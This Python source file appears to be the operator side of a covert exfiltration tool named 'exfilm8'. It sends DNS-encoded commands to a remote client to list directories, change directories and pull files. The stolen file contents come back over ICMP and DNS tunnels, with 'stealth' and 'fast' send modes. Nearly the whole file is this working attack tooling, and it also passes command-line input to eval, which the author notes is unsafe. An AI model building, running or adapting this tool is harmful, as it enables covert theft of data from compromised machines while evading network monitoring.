import socket
import binascii
import math
import threading
import struct
import argparse
import random
import cmd
import os

ICMP_PROTOCOL   = socket.getprotobyname('icmp')
UDP_PROTOCOL    = socket.getprotobyname('udp')

incomingFileBytes = bytearray()

complete = False
packetCount = 0

bindAddress = "127.0.0.1"

options = {'clientIP':'127.0.0.1', 'verbose':False}

bindPort    = 53
dstPort     = 1337

fileNameExt = 0
handle = None

def main():
    init()
    return

def init():
    global sendSocket
    global receiveICMPSocket
    global receiveDNSSocket
    global receiveICMPThread
    global receiveDNSThread

    # TODO: Handle errors on socket() and bind()
    sendSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    receiveDNSSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    receiveICMPSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    # ICMP doesn't use ports so it doesn't matter what port we specify
    receiveICMPSocket.bind((bindAddress, bindPort))
    receiveDNSSocket.bind((bindAddress, bindPort))

    
    console().cmdloop()

def calculateChecksum(data):
    pass

def confirmIntegrity(checksum):
    pass

def parseDNSPacket(data):
    global complete
    global packetCount

    packetCount += 1
    #print("Type: DNS Length: %d Index: %d" % (len(data),packetCount))
    # Remove DNS header and footer - first 12, and last 5 bytes
    data = data[12:-5]

    buf = b''
    labelLen = 0
    labelProgress = 0
    readingLabel = False

    for i in range(0, len(data)):
        if readingLabel:
            buf += data[i].to_bytes(1, "little")
            labelProgress += 1

            if labelProgress == labelLen:
                readingLabel = False
                labelProgress = 0
        else:
            labelLen = data[i]
            readingLabel = True

    return buf

def parseICMPPacket(data):
    # Remove IP and ICMP header. 20 + 12 bytes
    #print(data)
    data = data[28:]
    return data

def createDNSPacket(data):
    # ID (16), QR(1), OpCode(4), AA(1), TC(1), RD(1), RA(1), Z(1), RCode(16), QDCount(16), ANCount(16), NSCount(16), ARCount(16)
    # All flags are 0 so we can just use an unsigned short (16 bytes) of 0

    packetId = 666 #int((id(self) * random.random()) % 65535)

    dnsHeader = struct.pack("!HHHHHH", packetId, 0, 1, 0, 0, 0)

    # Add hostname terminating byte and final two options
    end = struct.pack("!HH", 1, 1)
    msg = data
    query = len(msg).to_bytes(1, "big") + msg + (0).to_bytes(1, "big")
    return dnsHeader + query + end

def startFileReceive():
    pass

def isEndOfFile(data):
    global complete

    if b'Completed' in data:
        complete = True
        return True
    else:
        return False

def receiveICMP(isFile):
    global complete

    while not complete:
        data, addr = receiveICMPSocket.recvfrom(1024)
        if options['verbose']:
            print("Received ICMP packet from: " + str(addr))
        # Remove erroneous packets not from client
        # TODO: IMPORTANT, need further checks as broadcasts/traffic still may come from client

        if addr[0] == options['clientIP']:
            parsed = parseICMPPacket(data)
            if isEndOfFile(parsed):
                if options['verbose']:
                    print("Received end of transmission")
                if isFile:
                    if options['verbose']:
                        print("Closing file")
                    handle.close()
                # Kill other receiving threads
                return
            else:
                if isFile:
                    try:
                        handle.write(parsed)
                    except Exception as e:
                        print("Error: " + str(e))
                else:
                    print(parsed.decode())
        else:
            if options['verbose']:
                print("Useless packet.")

def receiveDNS(isFile):
    global complete

    # TODO: IMPORTANT, remove duplicate code in receiveICMP, concatenate as much as possible in to one
    while not complete:
        data,addr = receiveDNSSocket.recvfrom(1024)
        if options['verbose']:
            print("Received DNS packet from: " + str(addr))
        # Remove erroneous packets not from client
        # TODO: IMPORTANT, need further checks as broadcasts/traffic still may come from client
        
        if addr[0] == options['clientIP']:
            parsed = parseDNSPacket(data)
            if isEndOfFile(parsed):
                if options['verbose']:
                    print("Received end of transmission")
                if isFile:
                    if options['verbose']:
                        print("Closing file")
                    handle.close()
                # Kill other receiving threads
                return
            else:
                if isFile:
                    try:
                        handle.write(parsed)
                    except Exception as e:
                        print("Error: " + str(e))
                else:
                    print(parsed.decode())
        else:   
            print("Useless packet.")

def receiveData(isFile=False, fileName=None):
    global complete
    global handle
    global fileNameExt

    complete = False

    print("Receiving...")

    # If receiving a file then open file with given name
    if isFile:
        if options['verbose']:
            print("Opening file '" + fileName + "'")
        handle = open("output/" + fileName, "wb")

    receiveICMPThread = threading.Thread(target=receiveICMP, args=(isFile,))
    receiveDNSThread = threading.Thread(target=receiveDNS, args=(isFile,))

    if not (receiveICMPThread.isAlive() | receiveDNSThread.isAlive()):
        receiveICMPThread.start()
        receiveDNSThread.start()
    
    # Block until finished receiving
    while not complete:
        pass

    if options['verbose']:
        print("Done")

def listen():
    # TODO: IMPORTANT, remove, debugging purposes only
    while True:
        data = receiveICMPSocket.recv(1024)
        print("Received packet from: " + str(addr))
        #print(data)
        # Remove erroneous packets not from client
        # TODO: Need further checks as broadcasts still may come from client
        #if addr[0] == options['clientIP']:
        #    parseDNSPacket(data)
        #else:
        #    print("Useless packet.")

def close():
    if options['verbose']:
        print("Closing file and socket")
    #receiveDNSSocket.close()
    handle.close()
    
class console(cmd.Cmd):
    intro = '''\
  ______      ___    ___ ________ ___  ___       _____ ______   ________     
|\  ___ \    |\  \  /  /|\  _____\\\  \|\  \     |\   _ \  _   \|\   __  \    
\ \   __/|   \ \  \/  / | \  \__/\ \  \ \  \    \ \  \\\\\__\ \  \ \  \|\  \   
 \ \  \_|/__  \ \    / / \ \   __\\\ \  \ \  \    \ \  \\\|__| \  \ \   __  \  
  \ \  \_|\ \  /     \/   \ \  \_| \ \  \ \  \____\ \  \    \ \  \ \  \|\  \ 
   \ \_______\/  /\   \    \ \__\   \ \__\ \_______\ \__\    \ \__\ \_______\\
    \|_______/__/ /\ __\    \|__|    \|__|\|_______|\|__|     \|__|\|_______|
             |__|/ \|__|
Written by Harvey Stocks.\n
    '''
    prompt = "exfilm8>"

    def do_remls(self, args):
        # Get list of files in working directory from client
        testPacket = createDNSPacket(b'remls')
        sendSocket.sendto(testPacket, (options['clientIP'], dstPort))
        receiveData()

    def do_remcd(self, args):
        # Set working directory on client
        testPacket = createDNSPacket(b'remcd ' + args.encode())
        sendSocket.sendto(testPacket, (options['clientIP'], dstPort))
        
    def do_rempwd(self, args):
        # Get working directory from client
        testPacket = createDNSPacket(b'rempwd')
        sendSocket.sendto(testPacket, (options['clientIP'], dstPort))
        receiveData()

    def do_close(self, args):
        # TODO: IMPORTANT, remove, debugging purposes only
        # Close file handle
        handle.close()
    
    def do_setopt(self, args):
        global options

        # Set up metasploit style setting of variables
        args = args.split(" ")
        if len(args) == 0:
            print("Enter an option and value\nUsage: setopt <optname> <optvalue>")
            return
        elif len(args) == 1:
            print("Enter a value for '" + args[0] + "'")
            return

        if args[0] in options:
            # TODO: IMPORTANT, using eval straight off the command line is ridiculously unsafe, change it
            options[args[0]] = eval(args[1], {}, {})
            #print(type(options[args[0]]))
        else:
            print("No option '" + args[0] + "'")
            return

    def do_showopts(self, args):
        # < is left align
        # =^ means pad with '='
        # 15 is the width of output
        print("{:<15} {:<15}".format("Option", "Value"))
        print("{:=^15} {:=^15}".format("", ""))
        for k,v in options.items():
            print("{:<15} {:<15}".format(str(k), str(v)))

    def do_exfil(self, args):
        argString = args
        args = "exfil " + args
        args = args.split(' ')
        args = args[1:] # Remove 'exfil' from the start
        parsedArgs = []

        parser = argparse.ArgumentParser(description="Set options for exfiltration")
        # Add send modes
        parser.add_argument('-s', dest="stealth", action="store_true", default=False, required=False)
        parser.add_argument('-f', dest="fast", action="store_true", default=False, required=False)
        parser.add_argument('-p', dest="pps", type=float, default=0)

        # Add packet options
        parser.add_argument('-i', dest="icmp", action="store_true", default=False, required=False)
        parser.add_argument('-d', dest="dns", action="store_true", default=False, required=False)
        parser.add_argument('-m', dest="mixed", action="store_true", default=False, required=False)

        # Add file to exfiltrate
        parser.add_argument('file')

        try:
            parsedArgs = parser.parse_args(args)
        except Exception as e:
            print("Error: Unable to parse command")

        # Check constraints on arguments
        ret = False

        if parsedArgs.stealth & parsedArgs.fast:
            print("Error: -s and -f are mutually exclusive")
            ret = True
        if (parsedArgs.stealth | parsedArgs.fast) & (parsedArgs.pps != 0):
            print("Error: -s, -f and -p are mutually exclusive")
            ret = True
        if parsedArgs.icmp & parsedArgs.dns:
            print("Error: Use -m for ICMP and DNS")
            ret = True
        if (parsedArgs.icmp | parsedArgs.dns) & parsedArgs.mixed:
            print("Error: Use -m without -i or -d")
            ret = True
        if ret:
            # Return after all errors have been printed
            return

        # Command is well formed if it reaches here

        # Start exfiltration of file
        fileName = os.path.split(parsedArgs.file)[1]
        command = ("exfil " + argString).encode()
        packet = createDNSPacket(command)
        sendSocket.sendto(packet, (options['clientIP'], dstPort))
        receiveData(True, fileName)
        # TODO: IMPORTANT, Add timeout for initiating file receive
        
    def do_threadStatus(self,args):
        print(receiveDNSThread.isAlive())
        print(receiveICMPThread.isAlive())

    def do_exit(self, args):
        '''
        if not receivingFile:
            self.close()
        else:
            choice = input("You are receiving a file. Are you sure you want to exit? Y/n")
            if choice.tolower() == "y":
                exit()
            else:
                return
        '''

    def emptyline(self):
        print("Enter a command. Type 'help' to display help page.")

    def default(self, line):
        print("'{}' is not recognised as a command.".format(line))

if __name__ == '__main__':
    main()
